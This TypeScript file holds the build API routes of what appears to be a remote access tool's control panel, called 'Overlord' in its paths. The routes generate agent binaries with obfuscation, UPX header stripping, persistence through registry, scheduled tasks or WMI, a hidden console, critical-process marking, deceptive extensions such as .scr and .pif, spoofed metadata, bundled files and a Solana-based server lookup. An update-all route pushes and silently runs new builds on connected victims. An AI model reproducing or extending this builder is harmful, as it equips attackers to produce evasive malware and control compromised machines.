import { createHash } from "crypto";
import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as buildManager from "../../build/buildManager";
import * as clientManager from "../../clientManager";
import {
  deleteBuild,
  getAllBuilds,
  getBuild,
  countBuildsForUser,
  getOldestBuildForUser,
  listBuildProfilesForUser,
  saveBuildProfileForUser,
  deleteBuildProfileForUser,
  setBuildBlocked,
  listClientIdsByBuildTag,
  countBuildClaimsBatch,
} from "../../db";
import { encodeMessage } from "../../protocol";
import { metrics } from "../../metrics";
import { requirePermission } from "../../rbac";
import { logger } from "../../logger";
import { normalizeClientOs } from "../deploy-utils";
import { canUserBuild, recordBuildStart, recordBuildEnd } from "../../build-rate-limit";
import { getConfig } from "../../config";
import path from "path";
import fs from "fs";
import { resolveRuntimeRoot } from "../runtime-paths";
import { createUploadPull } from "./file-download-routes";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type BuildRouteDeps = {
  startBuildProcess: (buildId: string, config: any) => Promise<void>;
  sanitizeMutex: (value?: string) => string | undefined;
  allowedPlatforms: Set<string>;
};

export async function handleBuildRoutes(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: BuildRouteDeps,
): Promise<Response | null> {
  if (!url.pathname.startsWith("/api/build")) {
    return null;
  }

  try {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (req.method === "POST" && url.pathname === "/api/build/start") {
      requirePermission(user, "clients:build");

      if (getConfig().registration.mode !== "off") {
        const rateLimitResult = canUserBuild(user.userId);
        if (!rateLimitResult.allowed) {
          return Response.json(
            { error: rateLimitResult.reason || "Build rate limit exceeded" },
            {
              status: 429,
              headers: rateLimitResult.retryAfter
                ? { "Retry-After": String(rateLimitResult.retryAfter) }
                : {},
            },
          );
        }
      }

      const body = await req.json();
      const {
        platforms,
        serverUrl,
        rawServerList,
        solMemo,
        solAddress,
        solRpcEndpoints,
        stripDebug,
        disableCgo,
        obfuscate,
        enablePersistence,
        persistenceMethods,
        startupName,
        mutex,
        disableMutex,
        hideConsole,
        noPrinting,
        outputName,
        garbleLiterals,
        garbleTiny,
        garbleSeed,
        assemblyTitle,
        assemblyProduct,
        assemblyCompany,
        assemblyVersion,
        assemblyCopyright,
        iconBase64,
        enableUpx,
        upxStripHeaders,
        requireAdmin,
        criticalProcess,
        outputExtension,
        sleepSeconds,
        boundFiles,
        iosBundleId,
      } = body;

      if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
        return Response.json({ error: "No platforms specified" }, { status: 400 });
      }

      let safeMutex: string | undefined;
      try {
        safeMutex = typeof mutex === "string" ? deps.sanitizeMutex(mutex) : undefined;
      } catch (err: any) {
        return Response.json({ error: err?.message || "Invalid mutex" }, { status: 400 });
      }
      const safeDisableMutex = !!disableMutex;
      const sanitizedPlatforms = platforms.filter((p: string) => typeof p === "string");
      if (sanitizedPlatforms.length !== platforms.length) {
        return Response.json({ error: "Invalid platform entries" }, { status: 400 });
      }
      const allowedPlatforms = sanitizedPlatforms.filter((p: string) =>
        deps.allowedPlatforms.has(p),
      );
      if (allowedPlatforms.length === 0) {
        return Response.json({ error: "No valid platforms specified" }, { status: 400 });
      }

      const safeRawServerList = !!rawServerList;
      const safeSolMemo = !!solMemo;
      const safeServerUrl =
        typeof serverUrl === "string" && serverUrl.trim() !== ""
          ? serverUrl.trim()
          : undefined;

      if (safeRawServerList && safeSolMemo) {
        return Response.json(
          { error: "Cannot enable both raw server list and Solana memo mode" },
          { status: 400 },
        );
      }

      if (safeRawServerList) {
        if (!safeServerUrl) {
          return Response.json(
            { error: "Raw server list requires a server URL" },
            { status: 400 },
          );
        }
        try {
          const parsed = new URL(safeServerUrl);
          if (parsed.protocol !== "https:") {
            return Response.json(
              { error: "Raw server list URL must use https" },
              { status: 400 },
            );
          }
        } catch {
          return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
        }
      }

      let safeSolAddress: string | undefined;
      let safeSolRpcEndpoints: string | undefined;
      if (safeSolMemo) {
        if (typeof solAddress !== "string" || !solAddress.trim()) {
          return Response.json(
            { error: "Solana memo mode requires a Solana address" },
            { status: 400 },
          );
        }
        const trimmedAddr = solAddress.trim();
        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmedAddr)) {
          return Response.json(
            { error: "Invalid Solana address (must be Base58, 32-44 chars)" },
            { status: 400 },
          );
        }
        safeSolAddress = trimmedAddr;

        if (typeof solRpcEndpoints === "string" && solRpcEndpoints.trim()) {
          const endpoints = solRpcEndpoints.split("\n").map((e: string) => e.trim()).filter(Boolean);
          for (const ep of endpoints) {
            try {
              const parsed = new URL(ep);
              if (parsed.protocol !== "https:" && parsed.protocol !== "http:") {
                return Response.json(
                  { error: `Invalid RPC endpoint protocol: ${ep}` },
                  { status: 400 },
                );
              }
            } catch {
              return Response.json(
                { error: `Invalid RPC endpoint URL: ${ep}` },
                { status: 400 },
              );
            }
          }
          safeSolRpcEndpoints = endpoints.join(",");
        }
      }

      const buildId = uuidv4();
      const ip = server.requestIP(req)?.address || "unknown";

      // Enforce max 10 builds per user — auto-delete oldest when limit exceeded
      const MAX_BUILDS_PER_USER = 10;
      const currentCount = countBuildsForUser(user.userId);
      if (currentCount >= MAX_BUILDS_PER_USER) {
        const oldest = getOldestBuildForUser(user.userId);
        if (oldest) {
          if (oldest.files) {
            const rootDir = resolveRuntimeRoot();
            const outDir = path.join(rootDir, "dist-clients");
            for (const file of oldest.files) {
              try {
                const fp = path.join(outDir, file.filename);
                if (fs.existsSync(fp)) {
                  fs.unlinkSync(fp);
                }
              } catch {}
            }
          }
          buildManager.deleteBuildStream(oldest.id);
          deleteBuild(oldest.id);
          logger.info(`[build:limit] Auto-deleted oldest build ${oldest.id.substring(0, 8)} for user ${user.username} (limit: ${MAX_BUILDS_PER_USER})`);
        }
      }

      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        details: `Started build ${buildId} for platforms: ${allowedPlatforms.join(", ")}`,
        success: true,
      });

      const safeNoPrinting = !!noPrinting;
      const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
      const safePersistenceMethods: string[] =
        Array.isArray(persistenceMethods)
          ? persistenceMethods
              .filter((m: unknown) => typeof m === 'string' && VALID_PERSISTENCE_METHODS.has((m as string).toLowerCase()))
              .map((m: string) => m.toLowerCase())
          : ['startup'];
      if (safePersistenceMethods.length === 0) safePersistenceMethods.push('startup');
      const safeStartupName =
        typeof startupName === 'string' && /^[A-Za-z0-9_.-]{1,64}$/.test(startupName.trim())
          ? startupName.trim()
          : undefined;
      const hasDarwinTarget = allowedPlatforms.some((p) => p.startsWith('darwin-'));
      const hasIosTarget = allowedPlatforms.some((p) => p.startsWith('ios-'));
      if ((hasDarwinTarget || hasIosTarget) && safeStartupName && !safeStartupName.startsWith('com.')) {
        return Response.json(
          { error: 'Startup name for macOS must start with "com." (e.g. com.apple.updater)' },
          { status: 400 },
        );
      }
      const safeOutputName = typeof outputName === "string" && /^[A-Za-z0-9._-]{1,64}$/.test(outputName.trim())
        ? outputName.trim()
        : undefined;
      const safeGarbleSeed = typeof garbleSeed === "string" && /^[A-Za-z0-9]{1,64}$/.test(garbleSeed.trim())
        ? garbleSeed.trim()
        : undefined;
      const safeAssemblyVersion = typeof assemblyVersion === "string" && /^\d{1,5}\.\d{1,5}\.\d{1,5}\.\d{1,5}$/.test(assemblyVersion.trim())
        ? assemblyVersion.trim()
        : undefined;
      const safeStr = (val: any, max = 128) =>
        typeof val === "string" && val.trim().length > 0 ? val.trim().slice(0, max) : undefined;
      const safeIconBase64 = typeof iconBase64 === "string" && iconBase64.length > 0 && iconBase64.length <= 2 * 1024 * 1024
        ? iconBase64
        : undefined;
      const safeRequireAdmin = !!requireAdmin;
      const safeCriticalProcess = !!criticalProcess;
      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
      const safeOutputExtension =
        typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
          ? outputExtension.toLowerCase() : ".exe";
      const safeSleepSeconds =
        typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
          ? sleepSeconds : 0;

      const MAX_BOUND_FILES = 5;
      const MAX_BOUND_FILE_BYTES = 50 * 1024 * 1024;
      const ALLOWED_BIND_TARGET_OS = new Set(["windows", "linux", "darwin"]);
      const RESERVED_BIND_NAMES = new Set(["manifest.json"]);
      type SafeBoundFile = { name: string; data: string; targetOS: string[]; execute: boolean };
      let safeBoundFiles: SafeBoundFile[] | undefined;
      if (Array.isArray(boundFiles) && boundFiles.length > 0) {
        if (boundFiles.length > MAX_BOUND_FILES) {
          return Response.json({ error: `Maximum ${MAX_BOUND_FILES} bound files allowed` }, { status: 400 });
        }
        const seenNames = new Set<string>();
        const validated: SafeBoundFile[] = [];
        for (const f of boundFiles) {
          if (!f || typeof f !== "object") {
            return Response.json({ error: "Invalid bound file entry" }, { status: 400 });
          }
          const rawName = typeof f.name === "string" ? f.name : "";
          const safeName = rawName.replace(/[^A-Za-z0-9._-]/g, "").slice(0, 64);
          if (!safeName) {
            return Response.json({ error: "Bound file has an invalid name" }, { status: 400 });
          }
          if (RESERVED_BIND_NAMES.has(safeName)) {
            return Response.json({ error: `'${safeName}' is a reserved filename` }, { status: 400 });
          }
          if (seenNames.has(safeName)) {
            return Response.json({ error: `Duplicate bound file name: ${safeName}` }, { status: 400 });
          }
          seenNames.add(safeName);
          if (typeof f.data !== "string" || f.data.length === 0) {
            return Response.json({ error: `Bound file '${safeName}' has no data` }, { status: 400 });
          }
          const approxDecodedBytes = Math.floor(f.data.length * 3 / 4);
          if (approxDecodedBytes > MAX_BOUND_FILE_BYTES) {
            return Response.json({ error: `Bound file '${safeName}' exceeds the 50 MB limit` }, { status: 400 });
          }
          const safeTargetOS = Array.isArray(f.targetOS)
            ? f.targetOS.filter((o: unknown) => typeof o === "string" && ALLOWED_BIND_TARGET_OS.has(o as string)) as string[]
            : [];
          validated.push({
            name: safeName,
            data: f.data,
            targetOS: safeTargetOS,
            execute: f.execute !== false, // default true
          });
        }
        safeBoundFiles = validated;
      }

      const rateLimitActive = getConfig().registration.mode !== "off";
      if (rateLimitActive) recordBuildStart(user.userId);

      deps.startBuildProcess(buildId, {
        platforms: allowedPlatforms,
        serverUrl: safeServerUrl,
        rawServerList: safeRawServerList,
        solMemo: safeSolMemo,
        solAddress: safeSolAddress,
        solRpcEndpoints: safeSolRpcEndpoints,
        mutex: safeMutex,
        disableMutex: safeDisableMutex,
        stripDebug,
        disableCgo,
        obfuscate: !!obfuscate,
        enablePersistence,
        persistenceMethods: safePersistenceMethods,
        startupName: safeStartupName,
        hideConsole: !!hideConsole,
        noPrinting: safeNoPrinting,
        builtByUserId: user.userId,
        outputName: safeOutputName,
        garbleLiterals: !!garbleLiterals,
        garbleTiny: !!garbleTiny,
        garbleSeed: safeGarbleSeed,
        assemblyTitle: safeStr(assemblyTitle),
        assemblyProduct: safeStr(assemblyProduct),
        assemblyCompany: safeStr(assemblyCompany),
        assemblyVersion: safeAssemblyVersion,
        assemblyCopyright: safeStr(assemblyCopyright),
        iconBase64: safeIconBase64,
        enableUpx: !!enableUpx,
        upxStripHeaders: !!upxStripHeaders,
        requireAdmin: safeRequireAdmin,
        criticalProcess: safeCriticalProcess,
        outputExtension: safeOutputExtension,
        sleepSeconds: safeSleepSeconds,
        boundFiles: safeBoundFiles,
        iosBundleId: typeof iosBundleId === "string" && /^[a-zA-Z0-9.-]{1,128}$/.test(iosBundleId.trim()) ? iosBundleId.trim() : undefined,
      }).finally(() => {
        if (rateLimitActive) recordBuildEnd(user.userId);
      });

      return Response.json({ buildId });
    }

    if (req.method === "GET" && url.pathname === "/api/build/list") {
      requirePermission(user, "clients:build");

      const showAll = url.searchParams.get("all") === "true" && user.role === "admin";
      const builds = showAll
        ? getAllBuilds(undefined, "admin")
        : getAllBuilds(user.userId, user.role === "admin" ? "operator" : user.role);

      const claimCounts = countBuildClaimsBatch(builds.map((b) => b.id));
      const enriched = builds.map((b) => ({
        ...b,
        claimCount: claimCounts.get(b.id) ?? 0,
      }));
      return Response.json({ builds: enriched });
    }

    if (req.method === "GET" && url.pathname === "/api/build/profiles") {
      requirePermission(user, "clients:build");

      const profiles = listBuildProfilesForUser(user.userId).map((p) => {
        let parsedConfig: any = {};
        try {
          parsedConfig = JSON.parse(p.profileJson);
        } catch {
          parsedConfig = {};
        }
        return {
          name: p.name,
          config: parsedConfig,
          createdAt: p.createdAt,
          updatedAt: p.updatedAt,
        };
      });
      return Response.json({ profiles });
    }

    if (req.method === "POST" && url.pathname === "/api/build/profiles") {
      requirePermission(user, "clients:build");

      const body = await req.json();
      const name = typeof body?.name === "string" ? body.name.trim() : "";
      const config = body?.config;

      if (!name || name.length > 64 || !/^[A-Za-z0-9 _.-]+$/.test(name)) {
        return Response.json(
          { error: "Invalid profile name (1-64 chars, letters/numbers/space/._-)" },
          { status: 400 },
        );
      }

      if (!config || typeof config !== "object" || Array.isArray(config)) {
        return Response.json({ error: "Invalid profile config" }, { status: 400 });
      }

      const MAX_PROFILES_PER_USER = 50;
      const existingProfiles = listBuildProfilesForUser(user.userId);
      const hasExistingWithSameName = existingProfiles.some((p) => p.name === name);
      if (!hasExistingWithSameName && existingProfiles.length >= MAX_PROFILES_PER_USER) {
        return Response.json(
          { error: `Profile limit reached (${MAX_PROFILES_PER_USER} max)` },
          { status: 400 },
        );
      }

      let profileJson = "{}";
      try {
        profileJson = JSON.stringify(config);
      } catch {
        return Response.json({ error: "Profile config must be JSON serializable" }, { status: 400 });
      }

      if (profileJson.length > 512 * 1024) {
        return Response.json({ error: "Profile config too large (max 512KB)" }, { status: 400 });
      }

      saveBuildProfileForUser(user.userId, name, profileJson);
      return Response.json({ success: true });
    }

    if (req.method === "DELETE" && url.pathname.match(/^\/api\/build\/profiles\/.+$/)) {
      requirePermission(user, "clients:build");

      const encodedName = url.pathname.split("/api/build/profiles/")[1] || "";
      let name = "";
      try {
        name = decodeURIComponent(encodedName).trim();
      } catch {
        return Response.json({ error: "Invalid profile name" }, { status: 400 });
      }
      if (!name) {
        return Response.json({ error: "Invalid profile name" }, { status: 400 });
      }

      const deleted = deleteBuildProfileForUser(user.userId, name);
      if (!deleted) {
        return Response.json({ error: "Profile not found" }, { status: 404 });
      }
      return Response.json({ success: true });
    }

    if (req.method === "DELETE" && url.pathname.match(/^\/api\/build\/(.+)\/delete$/)) {
      requirePermission(user, "clients:build");

      const buildId = decodeURIComponent(url.pathname.split("/")[3]);

      const build = getBuild(buildId);
      if (!build) {
        return new Response("Not Found", { status: 404 });
      }
      if (build.builtByUserId && build.builtByUserId !== user.userId && user.role !== "admin") {
        return new Response("Forbidden", { status: 403 });
      }
      if (build.files) {
        const rootDir = resolveRuntimeRoot();
        const outDir = path.join(rootDir, "dist-clients");
        for (const file of build.files) {
          try {
            const filePath = path.join(outDir, file.filename);
            if (fs.existsSync(filePath)) {
              fs.unlinkSync(filePath);
              logger.info(`[build:delete] Removed file: ${filePath}`);
            }
          } catch (err) {
            logger.warn(`[build:delete] Failed to remove file ${file.filename}:`, err);
          }
        }
      }

      buildManager.deleteBuildStream(buildId);
      deleteBuild(buildId);

      const ip = server.requestIP(req)?.address || "unknown";
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        details: `Deleted build ${buildId}`,
        success: true,
      });

      logger.info(`[build:delete] Build ${buildId.substring(0, 8)} deleted by ${user.username}`);
      return Response.json({ success: true });
    }

    if (req.method === "POST" && url.pathname.match(/^\/api\/build\/(.+)\/block$/)) {
      requirePermission(user, "clients:build");

      const buildId = decodeURIComponent(url.pathname.split("/")[3]);
      const build = getBuild(buildId);
      if (!build) {
        return new Response("Not Found", { status: 404 });
      }
      if (build.builtByUserId && build.builtByUserId !== user.userId && user.role !== "admin") {
        return new Response("Forbidden", { status: 403 });
      }

      let body: any = {};
      try {
        body = await req.json();
      } catch {
        // empty body = default to block (true)
      }
      const blocked = body && typeof body.blocked === "boolean" ? body.blocked : true;

      const ok = setBuildBlocked(buildId, blocked);
      if (!ok) {
        return Response.json({ error: "Build not found" }, { status: 404 });
      }

      let disconnected = 0;
      if (blocked && build.buildTag) {
        const clientIds = listClientIdsByBuildTag(build.buildTag);
        for (const cid of clientIds) {
          const target = clientManager.getClient(cid);
          if (!target?.ws) continue;
          try {
            target.ws.send(
              encodeMessage({
                type: "command",
                commandType: "disconnect",
                id: uuidv4(),
                payload: { reason: "build_blocked" },
              }),
            );
          } catch {}
          try { target.ws.close(4007, "build_blocked"); } catch {}
          disconnected++;
        }
      }

      const ip = server.requestIP(req)?.address || "unknown";
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        details: `${blocked ? "Blocked" : "Unblocked"} build ${buildId}${blocked && disconnected > 0 ? ` (kicked ${disconnected} live agents)` : ""}`,
        success: true,
      });

      logger.info(`[build:block] Build ${buildId.substring(0, 8)} ${blocked ? "blocked" : "unblocked"} by ${user.username}${blocked && disconnected > 0 ? ` (${disconnected} live agents kicked)` : ""}`);
      return Response.json({ success: true, blocked, disconnected });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/stream$/)) {
      requirePermission(user, "clients:build");

      const buildId = url.pathname.split("/")[3];
      const build = buildManager.getBuildStream(buildId);

      if (!build) {
        return Response.json({ error: "Build not found" }, { status: 404 });
      }
      if (build.userId && build.userId !== user.userId && user.role !== "admin") {
        return new Response("Forbidden", { status: 403 });
      }

      logger.info(`[build:${buildId.substring(0, 8)}] Client connected to stream`);

      const stream = new ReadableStream({
        start(controller) {
          build.controllers.push(controller);
          logger.info(
            `[build:${buildId.substring(0, 8)}] Added controller, total: ${build.controllers.length}`,
          );

          const encoder = new TextEncoder();
          try {
            controller.enqueue(
              encoder.encode(
                `data: ${JSON.stringify({ type: "status", text: "Connected to build stream" })}\n\n`,
              ),
            );
          } catch (err) {
            logger.error(
              `[build:${buildId.substring(0, 8)}] Failed to send initial message:`,
              err,
            );
          }
        },
        cancel() {
          const index = build.controllers.indexOf(this as any);
          if (index > -1) {
            build.controllers.splice(index, 1);
            logger.info(
              `[build:${buildId.substring(0, 8)}] Controller removed, remaining: ${build.controllers.length}`,
            );
          }
        },
      });

      return new Response(stream, {
        headers: {
          "Content-Type": "text/event-stream",
          "Cache-Control": "no-cache",
          Connection: "keep-alive",
          "X-Accel-Buffering": "no",
        },
      });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/info$/)) {
      requirePermission(user, "clients:build");

      const buildId = url.pathname.split("/")[3];
      const build = buildManager.getBuildStream(buildId);

      if (!build) {
        const dbBuild = getBuild(buildId);
        if (!dbBuild) {
          return Response.json({ error: "Build not found" }, { status: 404 });
        }
        if (dbBuild.builtByUserId && dbBuild.builtByUserId !== user.userId && user.role !== "admin") {
          return new Response("Forbidden", { status: 403 });
        }
        return Response.json({
          id: dbBuild.id,
          status: dbBuild.status,
          startTime: dbBuild.startTime,
          expiresAt: dbBuild.expiresAt,
          files: dbBuild.files,
        });
      }

      if (build.userId && build.userId !== user.userId && user.role !== "admin") {
        return new Response("Forbidden", { status: 403 });
      }
      return Response.json({
        id: build.id,
        status: build.status,
        startTime: build.startTime,
        expiresAt: build.expiresAt,
        files: build.files,
      });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/download\//)) {
      requirePermission(user, "clients:build");

      const rawName = url.pathname.split("/api/build/download/")[1] || "";
      let fileName = rawName;
      try {
        fileName = decodeURIComponent(rawName);
      } catch {
        return Response.json({ error: "Bad request" }, { status: 400 });
      }

      if (
        !fileName ||
        fileName.includes("\u0000") ||
        fileName.includes("/") ||
        fileName.includes("\\") ||
        fileName.includes("\"") ||
        fileName.includes("\r") ||
        fileName.includes("\n") ||
        fileName.includes(";")
      ) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      const allBuilds = getAllBuilds(undefined, "admin");
      const owningBuild = allBuilds.find((b) =>
        Array.isArray(b.files) && b.files.some((f: any) => f && f.filename === fileName),
      );
      if (!owningBuild) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }
      if (
        owningBuild.builtByUserId &&
        owningBuild.builtByUserId !== user.userId &&
        user.role !== "admin"
      ) {
        return new Response("Forbidden", { status: 403 });
      }

      const rootDir = resolveRuntimeRoot();
      const distRoot = path.resolve(rootDir, "dist-clients");
      const filePath = path.resolve(distRoot, fileName);
      const rootWithSep = distRoot.endsWith(path.sep)
        ? distRoot
        : `${distRoot}${path.sep}`;

      if (!filePath.startsWith(rootWithSep)) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      const file = Bun.file(filePath);
      if (!(await file.exists())) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      return new Response(file, {
        headers: {
          "Content-Type": "application/octet-stream",
          "Content-Disposition": `attachment; filename="${fileName}"`,
        },
      });
    }

    if (req.method === "POST" && url.pathname === "/api/build/update-eligible") {
      requirePermission(user, "clients:build");

      let body: any = {};
      try {
        body = await req.json();
      } catch {
        return new Response("Bad request", { status: 400 });
      }

      // Accept either a buildId (check existing build files) or platforms array (pre-build check)
      const buildId = typeof body?.buildId === "string" ? body.buildId : "";
      const platforms: string[] = Array.isArray(body?.platforms) ? body.platforms.filter((p: any) => typeof p === "string") : [];

      let targetPlatforms: Set<string>;

      if (buildId) {
        const build = buildManager.getBuildStream(buildId);
        const dbBuild = !build ? getBuild(buildId) : null;
        const files = build?.files ?? dbBuild?.files;
        if (!files || files.length === 0) {
          return Response.json({ error: "Build not found or has no files" }, { status: 404 });
        }

        const rootDir = resolveRuntimeRoot();
        const distRoot = path.resolve(rootDir, "dist-clients");

        targetPlatforms = new Set<string>();
        for (const f of files as any[]) {
          const platform = (f as any).platform as string | undefined;
          const filename = f.filename || f.name;
          if (!platform || !filename) continue;
          const filePath = path.resolve(distRoot, filename);
          if (fs.existsSync(filePath)) {
            targetPlatforms.add(platform);
          }
        }
      } else if (platforms.length > 0) {
        targetPlatforms = new Set(platforms);
      } else {
        return Response.json({ error: "Missing buildId or platforms" }, { status: 400 });
      }

      if (targetPlatforms.size === 0) {
        return Response.json({ error: "No matching platforms found" }, { status: 404 });
      }

      const onlineClients = clientManager.getOnlineClients();
      let eligible = 0;
      let skippedInMemory = 0;
      let skippedNoMatch = 0;

      for (const client of onlineClients) {
        if (client.inMemory) {
          skippedInMemory++;
          continue;
        }
        const clientOs = client.os?.toLowerCase() || "";
        const clientArch = client.arch?.toLowerCase() || "";
        const clientPlatform = `${clientOs}-${clientArch}`;
        if (!targetPlatforms.has(clientPlatform)) {
          skippedNoMatch++;
          continue;
        }
        eligible++;
      }

      return Response.json({
        eligible,
        skippedInMemory,
        skippedNoMatch,
        totalOnline: onlineClients.length,
      });
    }

    if (req.method === "POST" && url.pathname === "/api/build/update-all") {
      requirePermission(user, "clients:build");
      if (user.role !== "admin") {
        return new Response("Forbidden: Admin access required", { status: 403 });
      }

      let body: any = {};
      try {
        body = await req.json();
      } catch {
        return new Response("Bad request", { status: 400 });
      }

      const buildId = typeof body?.buildId === "string" ? body.buildId : "";
      if (!buildId) {
        return Response.json({ error: "Missing buildId" }, { status: 400 });
      }

      const build = buildManager.getBuildStream(buildId);
      const dbBuild = !build ? getBuild(buildId) : null;
      const files = build?.files ?? dbBuild?.files;
      if (!files || files.length === 0) {
        return Response.json({ error: "Build not found or has no files" }, { status: 404 });
      }

      const rootDir = resolveRuntimeRoot();
      const distRoot = path.resolve(rootDir, "dist-clients");

      const hideWindow = body?.hideWindow === true;

      const buildPlatforms = new Map<string, { filename: string; filePath: string; size: number }>();
      for (const f of files as any[]) {
        const platform = (f as any).platform as string | undefined;
        const filename = f.filename || f.name;
        if (!platform || !filename) continue;
        const filePath = path.resolve(distRoot, filename);
        const rootWithSep = distRoot.endsWith(path.sep) ? distRoot : `${distRoot}${path.sep}`;
        if (!filePath.startsWith(rootWithSep)) continue;
        if (!fs.existsSync(filePath)) continue;
        const stat = fs.statSync(filePath);
        buildPlatforms.set(platform, { filename, filePath, size: stat.size });
      }

      if (buildPlatforms.size === 0) {
        return Response.json({ error: "No build files found on disk" }, { status: 404 });
      }

      // Pre-compute hashes per platform (avoid re-reading per client)
      const platformHashes = new Map<string, string>();
      for (const [platform, buildFile] of buildPlatforms) {
        const fileBytes = new Uint8Array(fs.readFileSync(buildFile.filePath));
        platformHashes.set(platform, createHash("sha256").update(fileBytes).digest("hex"));
      }

      const onlineClients = clientManager.getOnlineClients();
      const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];

      for (const client of onlineClients) {
        if (client.inMemory) {
          results.push({ clientId: client.id, ok: false, reason: "in_memory" });
          continue;
        }
        if (!client.ws) {
          results.push({ clientId: client.id, ok: false, reason: "no_ws" });
          continue;
        }

        const clientOs = client.os?.toLowerCase() || "";
        const clientArch = client.arch?.toLowerCase() || "";
        const clientPlatform = `${clientOs}-${clientArch}`;
        const buildFile = buildPlatforms.get(clientPlatform);
        if (!buildFile) {
          results.push({ clientId: client.id, ok: false, reason: "no_matching_build" });
          continue;
        }

        try {
          const fileHash = platformHashes.get(clientPlatform)!;
          const clientNormOs = normalizeClientOs(client.os);
          const destDir = clientNormOs === "windows"
            ? `C:\\Windows\\Temp\\Overlord\\update-${buildId.substring(0, 8)}`
            : `/tmp/overlord/update-${buildId.substring(0, 8)}`;
          const destPath = clientNormOs === "windows"
            ? `${destDir}\\${buildFile.filename}`
            : `${destDir}/${buildFile.filename}`;

          const pullId = createUploadPull({
            clientId: client.id,
            filePath: buildFile.filePath,
            fileName: buildFile.filename,
            size: buildFile.size,
          });
          const pullUrl = `${url.origin}/api/file/upload/pull/${encodeURIComponent(pullId)}`;

          client.ws.send(
            encodeMessage({
              type: "command",
              commandType: "file_upload_http",
              id: uuidv4(),
              payload: { path: destPath, url: pullUrl, total: buildFile.size },
            }),
          );

          if (clientNormOs !== "windows") {
            client.ws.send(
              encodeMessage({
                type: "command",
                commandType: "file_chmod",
                id: uuidv4(),
                payload: { path: destPath, mode: "0755" },
              }),
            );
          }

          client.ws.send(
            encodeMessage({
              type: "command",
              commandType: "agent_update",
              id: uuidv4(),
              payload: { path: destPath, hash: fileHash, hideWindow },
            }),
          );

          metrics.recordCommand("agent_update");
          results.push({ clientId: client.id, ok: true });
        } catch (err: any) {
          results.push({ clientId: client.id, ok: false, reason: err?.message || "unknown_error" });
        }
      }

      const successCount = results.filter((r) => r.ok).length;
      const ip = server.requestIP(req)?.address || "unknown";
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.AGENT_UPDATE,
        success: true,
        details: `update-all: ${successCount}/${onlineClients.length} clients updated from build ${buildId.substring(0, 8)}`,
      });

      logger.info(`[build:update-all] ${user.username} updated ${successCount}/${onlineClients.length} clients from build ${buildId.substring(0, 8)}`);

      return Response.json({
        ok: true,
        totalOnline: onlineClients.length,
        successCount,
        results,
      });
    }

    return new Response("Not found", { status: 404 });
  } catch (error) {
    if (error instanceof Response) {
      return error;
    }
    logger.error("[build] API error:", error);
    return Response.json({ error: "Internal server error" }, { status: 500 });
  }
}
